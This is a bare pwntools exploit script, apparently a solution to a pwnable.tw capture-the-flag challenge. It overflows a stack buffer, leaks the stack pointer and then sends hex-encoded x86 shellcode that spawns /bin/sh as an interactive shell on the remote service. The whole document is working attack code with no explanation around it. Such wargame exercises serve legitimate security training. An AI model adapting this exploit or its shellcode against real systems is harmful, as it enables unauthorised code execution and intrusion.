from pwn import *
p=remote('chall.pwnable.tw', 10000)
payload=b"x"*0x14
payload+=p32(0x08048087)
p.sendafter(b":",payload)
esp=p.recv()[:4]
sc=bytes.fromhex('682f736800682f62696e31c989ca89e3b80b000000cd80')
payload2=b"y"*0x14+p32(u32(esp)+0x14)+sc
p.send(payload2)
p.interactive()
